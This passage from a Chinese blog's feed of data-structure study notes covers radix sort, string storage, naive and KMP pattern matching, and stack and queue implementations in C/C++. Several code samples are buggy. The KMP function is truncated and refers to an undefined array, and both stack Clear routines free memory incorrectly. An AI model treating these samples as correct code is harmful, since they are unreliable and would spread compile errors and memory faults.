title="算法分析"></a>算法分析</h5><p>1.归并排序是稳定的排序方法</p><p>2.时间复杂度$nlog_2n$</p><p>3.空间复杂度$O(n)$</p><h4 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h4><p>基数排序起源于桶排序，把关键词为k的记录放在第k个箱子里，按按序号将非空的记录收集起来</p><p>缺点是：如果关键字位数太大这样做空间复杂性和时间复杂性都大大提高</p><h5 id="算法实现-8"><a href="#算法实现-8" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">records</span>&#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">celltype</span>&#123;</span><br><span class="line">    records data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QUEUE</span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *front;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *rear;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MAKENULL</span><span class="params">(QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(celltype*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(celltype));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">records <span class="title">FRONT</span><span class="params">(QUEUE Q)</span></span>&#123;</span><br><span class="line">    records e;</span><br><span class="line">    e.key=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        celltype* p= Q.front-&gt;next;</span><br><span class="line">        e.key=p-&gt;data.key;</span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">EMPTY</span><span class="params">(QUEUE Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ENQUEUE</span><span class="params">(records e,QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    celltype* p;</span><br><span class="line">    p=(celltype*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(celltype));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DEQUEUE</span><span class="params">(QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    celltype *p;</span><br><span class="line">    p=Q.front-&gt;next;</span><br><span class="line">    <span class="comment">//e=p-&gt;data;</span></span><br><span class="line">    Q.front-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q.rear=Q.front;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;DeQueue succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RADIX</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">int</span>)(k/<span class="built_in">pow</span>(<span class="number">10</span>,p<span class="number">-1</span>))%<span class="number">10</span>);</span><br><span class="line">&#125;<span class="comment">//求关键字k的第p位</span></span><br><span class="line"><span class="comment">//个：k%10</span></span><br><span class="line"><span class="comment">//十：k/10%10</span></span><br><span class="line"><span class="comment">//百：k/100%10</span></span><br><span class="line"><span class="comment">//千：k/1000%10</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">radixsort</span><span class="params">(<span class="type">int</span> figure,QUEUE &amp;A)</span></span>&#123;</span><br><span class="line">    QUEUE Q[<span class="number">10</span>];</span><br><span class="line">    records data;</span><br><span class="line">    <span class="type">int</span> pass,r,i;</span><br><span class="line">    <span class="keyword">for</span>(pass=<span class="number">1</span>;pass&lt;=figure;pass++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;++i)&#123;</span><br><span class="line">            <span class="built_in">MAKENULL</span>(Q[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="built_in">EMPTY</span>(A))&#123;</span><br><span class="line">            data=<span class="built_in">FRONT</span>(A);</span><br><span class="line">            <span class="built_in">DEQUEUE</span>(A);</span><br><span class="line">            r=<span class="built_in">RADIX</span>(data.key,pass);</span><br><span class="line">            <span class="built_in">ENQUEUE</span>(data,Q[r]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!<span class="built_in">EMPTY</span>(Q[i]))&#123;</span><br><span class="line">                data=<span class="built_in">FRONT</span>(Q[i]);</span><br><span class="line">                <span class="built_in">DEQUEUE</span>(Q[i]);</span><br><span class="line">                <span class="built_in">ENQUEUE</span>(data, A);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//基数排序</span></span><br></pre></td></tr></table></figure><h3 id="排序方法比较"><a href="#排序方法比较" class="headerlink" title="排序方法比较"></a>排序方法比较</h3><p><img src="/2023/11/23/排序方法比较.png" alt="排序方法比较"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 串</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="串"><a href="#串" class="headerlink" title="串"></a>串</h3><h4 id="串的定义"><a href="#串的定义" class="headerlink" title="串的定义"></a>串的定义</h4><p>串是由零个或多个字符组成的有限序列，记作：s=”$a_1a_2…a_n$”</p><p>其中，s是串的名，用双引号括起来的字符序列是串的值。</p><p>串长度：串中字符的数目n</p><p>空串：长度为零的串</p><p>子串：串中任意个连续的字符组成的子序列</p><p>主串：包含子串的串相应地称为主串</p><p>串相等：当两个串长度相等，且每个对应位置的字符都相等</p><p>空格串（空白串）：由一个或多个空格组成的串。要和“空串”区别，空格串有长度，就是空格的个数</p><h4 id="串的抽象数据类型的定义"><a href="#串的抽象数据类型的定义" class="headerlink" title="串的抽象数据类型的定义"></a>串的抽象数据类型的定义</h4><p>ADT String{</p><p>​    数据对象：D={$a_i$|$a_i \in$ CharacterSet,i=1,2,..,n, n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;|$a_{i-1}$,$a_i\in$D,i=2,3,…,n}</p><p>​    基本操作：</p><p>​        StrAssign(&amp;T,chars)    //根据串常量chars生成串T</p><p>​        DestrString(&amp;S)        //销毁串S</p><p>​        StrCopy(&amp;T,S)    //把串S中内容拷贝到T串</p><p>​        StrLength(S)     //求串长</p><p>​        StrCompare(S,T)  //比较串S和T</p><p>​        Concat(&amp;T,S1,S2)    //连接串</p><p>​        StrEmpty(S)        //判断串是否为空</p><p>​        SubString(&amp;Sub,S,pos,len)    //求子串</p><p>​        ClearString(&amp;S)     //清空串</p><p>​        Index(S,T,pos)    //子串定位</p><p>​        Replace(&amp;S,T,V)   //把串S中符合T的子串替换</p><p>​        StrInsert(&amp;S,pos,T)    //插入子串</p><p>​        StrDelete(&amp;S,pos,len)    //删除子串</p><p>}</p><h4 id="串的表示"><a href="#串的表示" class="headerlink" title="串的表示"></a>串的表示</h4><h5 id="定长顺序存储表示"><a href="#定长顺序存储表示" class="headerlink" title="定长顺序存储表示"></a>定长顺序存储表示</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSTRLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> Sstring[MAXSTRLEN+<span class="number">1</span>]</span><br><span class="line">Sstring S;</span><br></pre></td></tr></table></figure><h5 id="堆分配存储表示"><a href="#堆分配存储表示" class="headerlink" title="堆分配存储表示"></a>堆分配存储表示</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">char</span> *ch;</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;HString;</span><br></pre></td></tr></table></figure><h5 id="串的块链存储表示"><a href="#串的块链存储表示" class="headerlink" title="串的块链存储表示"></a>串的块链存储表示</h5><p>字符串本身是一个线性表，可以用链表存储</p><p>若用普通链表存储，存储密度低，浪费空间严重</p><p>解决办法：一个结点存储多个字符——即串的块链存储</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZZE 80</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Chunk</span>&#123;</span><br><span class="line"><span class="type">char</span> ch[CHUNKSIZE];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Chunk</span> *next;</span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">Chunk *head,*tail;</span><br><span class="line"><span class="type">int</span> curlen;</span><br><span class="line">&#125;LString;</span><br></pre></td></tr></table></figure><h4 id="模式匹配简单算法"><a href="#模式匹配简单算法" class="headerlink" title="模式匹配简单算法"></a>模式匹配简单算法</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Index</span><span class="params">(Sstring S,Sstring T,<span class="type">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    i=pos;</span><br><span class="line">    j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S[<span class="number">0</span>]&amp;&amp;j&lt;=T[<span class="number">0</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(S[i]==T[j])</span><br><span class="line">        &#123;</span><br><span class="line">            ++i;</span><br><span class="line">            ++j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i=i-j+<span class="number">2</span>;</span><br><span class="line">            j=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T[<span class="number">0</span>]) <span class="keyword">return</span> i-T[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//Index</span></span><br></pre></td></tr></table></figure><p>最好的情况的平均复杂度为$O(n+m)$</p><p>最坏的情况的平均复杂度为$O(n*m)$</p><h4 id="模式匹配KMP算法"><a href="#模式匹配KMP算法" class="headerlink" title="模式匹配KMP算法"></a>模式匹配KMP算法</h4><script type="math/tex; mode=display">next[j]=\begin{cases}max \{k|1<k<j，且t_1...t_{k-1}==t_{j-k+1}...t_{j-1}\} 当此集合非空时\\0 ,当j=1时\\1 其他情况\end{cases}</script><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> next[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> g</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Index_KMP</span><span class="params">(Sstring S,Sstring T,<span class="type">int</span> pos)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line">  i=pos;j=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(i&lt;=S[<span class="number">0</span>]&amp;&amp;j&lt;=T[<span class="number">0</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(j==<span class="number">0</span>||S[i]==T[j])&#123;</span><br><span class="line">    i++;</span><br><span class="line">    j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> j=next[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(j&gt;t[<span class="number">0</span>]) <span class="keyword">return</span> i-t[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 栈和队列</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><h4 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h4><p>栈(Stack)是一种特殊的线性表，其插入和删除操作均在表的一端进行，是一种运算受限的线性表</p><p>栈顶(top)是栈中允许插入和删除的一端</p><p>栈底(bottom)是栈顶的另一端</p><h4 id="栈的抽象数据类型"><a href="#栈的抽象数据类型" class="headerlink" title="栈的抽象数据类型"></a>栈的抽象数据类型</h4><p>ADT Stack{</p><p>​    数据对象：D={$a_i$|$a_i$ $\in$ElemSet ,i=1,2,…,n n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i \in D$,i=2,…,n}</p><p>​                        约定$a_n$为栈顶，$a_1$为栈底</p><p>​    基本操作：</p><p>​        InitStack(&amp;S)    //初始化栈</p><p>​        DestoryStack(&amp;S)    //销毁栈</p><p>​        ClearStack(&amp;S)    //清空栈</p><p>​        StackEmpty(S)    //判断栈是否为空</p><p>​        StackLength(S)    //求栈长度</p><p>​        GetTop(S,&amp;e)    //取栈顶元素</p><p>​        Push(&amp;S,e)    //入栈</p><p>​        Pop(&amp;S,&amp;e)    //出栈</p><p>​        StackTraverse(S,visit())    //遍历栈</p><p>}ADT Stack</p><h4 id="顺序栈存储结构实现"><a href="#顺序栈存储结构实现" class="headerlink" title="顺序栈存储结构实现"></a>顺序栈存储结构实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure><h4 id="顺序栈的操作实现"><a href="#顺序栈的操作实现" class="headerlink" title="顺序栈的操作实现"></a>顺序栈的操作实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    S.base=(SElemType*)<span class="built_in">malloc</span>(STACK_INIT_SIZE*<span class="built_in">sizeof</span>(SElemType));</span><br><span class="line">    <span class="keyword">if</span>(!S.base) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S.top=S.base;</span><br><span class="line">    S.stacksize=STACK_INIT_SIZE;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Init succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,SElemType e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base&gt;=S.stacksize)&#123;</span><br><span class="line">        S.base=(SElemType*)<span class="built_in">realloc</span>(S.base, (S.stacksize+STACKINCREMENT)*<span class="built_in">sizeof</span>(SElemType));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!S.base) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S.top=S.base+S.stacksize;</span><br><span class="line">    S.stacksize+=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    *S.top++=e;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Push succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        e=*(S.top<span class="number">-1</span>);</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Pop succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S.top&gt;S.base)&#123;</span><br><span class="line">        SElemType* p=S.top;</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        S.stacksize-=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Stack clear succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.base != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="built_in">Clear</span>(S);</span><br><span class="line">        <span class="built_in">free</span>(S.base);</span><br><span class="line">        S.base = <span class="literal">NULL</span>;</span><br><span class="line">        S.top = <span class="literal">NULL</span>;</span><br><span class="line">        S.stacksize = <span class="number">0</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Stack destroyed.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.base==S.top) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackLength</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(S.base==S.top)) <span class="keyword">return</span> S.top-S.base;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetTop</span><span class="params">(SqStack S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    e=*(S.top<span class="number">-1</span>);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;e is:&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackTravers</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">StackEmpty</span>(S))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!(S.top==S.base))&#123;</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;i&lt;&lt;<span class="string">&quot;. &quot;</span>;</span><br><span class="line">        cout&lt;&lt;(*(&amp;S.top))&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;(*(&amp;S.top))-&gt;b&lt;&lt;endl;</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqStack test;</span><br><span class="line">    SElemType e1;</span><br><span class="line">    e1=<span class="number">1</span>;</span><br><span class="line">    SElemType e2;</span><br><span class="line">    e2=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">InitStack</span>(test);</span><br><span class="line">    <span class="built_in">Push</span>(test, e1);</span><br><span class="line">    <span class="built_in">Push</span>(test, e2);</span><br><span class="line"> <span class="comment">/*   SElemType inputElem;</span></span><br><span class="line"><span class="comment">    int i=0,n;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;&quot;input number to input:&quot;;</span></span><br><span class="line"><span class="comment">    cin&gt;&gt;n;</span></span><br><span class="line"><span class="comment">    while (i&lt;n)&#123;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;&quot;inputElem.a:&quot;;</span></span><br><span class="line"><span class="comment">        cin&gt;&gt;inputElem.a;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;&quot;inputElem.b:&quot;;</span></span><br><span class="line"><span class="comment">        cin&gt;&gt;inputElem.b;</span></span><br><span class="line"><span class="comment">        i++;</span></span><br><span class="line"><span class="comment">        Push(test, inputElem);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="built_in">StackTravers</span>(test);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;the Stack&#x27;s length is:&quot;</span>&lt;&lt;<span class="built_in">StackLength</span>(test)&lt;&lt;endl;</span><br><span class="line">    SElemType e;</span><br><span class="line">    <span class="comment">//Pop(test,e);</span></span><br><span class="line">    <span class="comment">//cout&lt;&lt;&quot;Pop out e:&quot;&lt;&lt;e.a&lt;&lt;&quot;-&quot;&lt;&lt;e.b&lt;&lt;endl;</span></span><br><span class="line">    <span class="built_in">GetTop</span>(test,e);</span><br><span class="line">   <span class="comment">// StackTravers(test);</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="链栈的存储实现和操作"><a href="#链栈的存储实现和操作" class="headerlink" title="链栈的存储实现和操作"></a>链栈的存储实现和操作</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SNode</span>&#123;</span><br><span class="line">    SElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">SNode</span> *next;</span><br><span class="line">&#125;SNode,*LinkStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(LinkStack &amp;S)</span></span>&#123;</span><br><span class="line">    S=(SNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SNode));</span><br><span class="line">    <span class="keyword">if</span>(!S) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(LinkStack &amp;S,SElemType e)</span></span>&#123;</span><br><span class="line">    SNode* p;</span><br><span class="line">    p=(SNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SNode));</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=S-&gt;next;</span><br><span class="line">    S-&gt;next=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(LinkStack &amp;S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    SNode* p;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;next==<span class="literal">NULL</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    p=S-&gt;next;</span><br><span class="line">    e=p-&gt;data;</span><br><span class="line">    S-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(LinkStack &amp;S)</span> </span>&#123;</span><br><span class="line">    SNode* p = S-&gt;next; <span class="comment">// 从头结点之后的第一个节点开始</span></span><br><span class="line">    SNode* q;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        q = p-&gt;next; <span class="comment">// 保存下一个节点的引用</span></span><br><span class="line">        <span class="built_in">free</span>(q); <span class="comment">// 释放当前节点</span></span><br><span class="line">        p = q; <span class="comment">// 移动到下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    S-&gt;next = <span class="literal">NULL</span>; <span class="comment">// 清空后，将栈的头结点的下一个指针设为 NULL，表示空栈</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryStack</span><span class="params">(LinkStack &amp;S)</span></span>&#123;</span><br><span class="line">  <span class="built_in">Clear</span>(S);</span><br><span class="line">    <span class="built_in">free</span>(S);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><h4 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h4><p>队列(Queue)是一种运算受限的特殊线性表，它只允许在表的一段进行插入，而在表的另一段进行删除</p><h4 id="队列抽象数据类型"><a href="#队列抽象数据类型" class="headerlink" title="队列抽象数据类型"></a>队列抽象数据类型</h4><p>ADT Queue{</p><p>​    数据对象：D={$a_i$|$a_i$ $\in$ElemSet ,i=1,2,…,n n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i \in D$,i=2,…,n}</p><p>​                        约定$a_1$为队列头$a_n$为队列尾</p><p>​    基本操作：</p><p>​        InitQueue(&amp;Q)    //初始化队列</p><p>​        DestoryQueue(&amp;Q)    //销毁队列</p><p>​        ClearQueue(&amp;Q)    //清空队列</p><p>​        QueueEmpty(Q)    //判断队列是否为空</p><p>​        QueueLength(Q)    //求队列长度</p><p>​        GetHead(Q,&amp;e)    //取队列头元素</p><p>​        EnQueue(&amp;Q,e)    //入队列</p><p>​        DeQueue(&amp;Q,&amp;e)    //出队列</p><p>​        QueueTraverse(Q,visit())    //遍历栈</p><p>}ADT Queue</p><h4 id="链队列存储实现"><a href="#链队列存储实现" class="headerlink" title="链队列存储实现"></a>链队列存储实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>  <span class="title class_">QNode</span>&#123;</span><br><span class="line">    QElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure><h4 id="链队列的操作实现"><a href="#链队列的操作实现" class="headerlink" 